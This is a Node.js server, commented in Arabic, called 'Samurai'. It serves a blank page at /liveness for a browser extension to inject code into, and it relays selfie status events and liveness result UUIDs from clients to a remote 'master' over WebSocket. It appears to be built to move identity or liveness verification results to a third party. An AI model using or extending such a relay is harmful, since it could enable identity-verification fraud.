const WebSocket = require('ws');
const http = require('http');

// تم تعديل هذا السطر ليقرأ المنفذ من Railway أو يستخدم 8080 افتراضياً
const PORT = process.env.PORT || 8080;

// تخزين اتصالات الماستر: المفتاح هو رقم الجلسة (Session ID)
const masters = {}; 

const server = http.createServer((req, res) => {
    // إعدادات CORS للسماح بالاتصال من أي مصدر
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

    // 🔥 [جديد] نقطة دخول العميل: عرض صفحة بيضاء عند فتح الرابط
    // هذه الصفحة ضرورية لكي تجد "إضافة العميل" مكاناً لحقن الكود فيه
    if (req.method === 'GET' && req.url.startsWith('/liveness')) {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        // نرسل صفحة فارغة مع ID مميز (samurai-canvas)
        res.end('<html><head><title>Samurai Secure</title></head><body id="samurai-canvas"></body></html>');
        return;
    }

    // استقبال البيانات من العميل (POST) وتوجيهها للماستر
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const targetSession = data.session_id; 

                // التحقق من وجود الماستر المرتبط بالجلسة
                if (targetSession && masters[targetSession]) {
                    const masterWs = masters[targetSession];
                    
                    if (masterWs.readyState === WebSocket.OPEN) {
                        let messageToMaster = null;

                        // 1. التعامل مع إشعارات الحالة (فتح الرابط، بدأ السيلفي، الخطأ)
                        if (data.type) {
                            messageToMaster = {
                                type: data.type,
                                reason: data.reason || null // في حال وجود رسالة خطأ
                            };
                            console.log(`📢 [EVENT] ${data.type} for Session: ${targetSession.substring(0, 10)}...`);
                        } 
                        // 2. التعامل مع النتيجة النهائية (UUID) عند نجاح السيلفي
                        else if (data.payload) {
                            const decoded = Buffer.from(data.payload, 'base64').toString();
                            const jsonPayload = JSON.parse(decoded);
                            const uuid = jsonPayload.result;

                            messageToMaster = {
                                type: 'UUID_RECEIVED',
                                uuid: uuid
                            };
                            console.log(`🚀 [SUCCESS] UUID Received for Session: ${targetSession.substring(0, 10)}...`);
                        }

                        // إرسال البيانات للماستر إذا تم تحديد نوعها
                        if (messageToMaster) {
                            masterWs.send(JSON.stringify(messageToMaster));
                            res.writeHead(200, { 'Content-Type': 'application/json' });
                            res.end(JSON.stringify({ success: true, forwarded: true }));
                            return;
                        }
                    } else {
                        console.log("⚠️ Master socket exists but is not open.");
                    }
                } else {
                    console.log(`❌ No active Master for session: ${targetSession?.substring(0, 10)}...`);
                }

                // رد افتراضي في حال عدم وجود ماستر أو بيانات غير معروفة
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: false, message: "No master to receive data" }));

            } catch (e) {
                console.error("Payload Error:", e);
                res.writeHead(400); res.end();
            }
        });
        return;
    }

    res.writeHead(200); res.end('Samurai Multi-User Server with Monitoring Ready 🥷');
});

const wss = new WebSocket.Server({ server });

wss.on('connection', (ws) => {
    let mySessionId = null;

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            // تسجيل الماستر عند فتح واجهة الساموراي
            if (data.type === 'REGISTER_MASTER' && data.session_id) {
                mySessionId = data.session_id;
                masters[mySessionId] = ws;
                console.log(`👨‍💻 [MASTER REGISTERED] ID: ${mySessionId.substring(0, 15)}...`);
            }
        } catch(e) { console.error("WS Error:", e); }
    });

    // تنظيف الذاكرة عند إغلاق الماستر للمتصفح
    ws.on('close', () => {
        if (mySessionId && masters[mySessionId]) {
            delete masters[mySessionId];
            console.log(`🔌 [MASTER DISCONNECTED] Room ${mySessionId.substring(0, 10)}... cleaned.`);
        }
    });
});

server.listen(PORT, () => {
    console.log(`🚀 SAMURAI SERVER RUNNING ON PORT ${PORT}`);
});
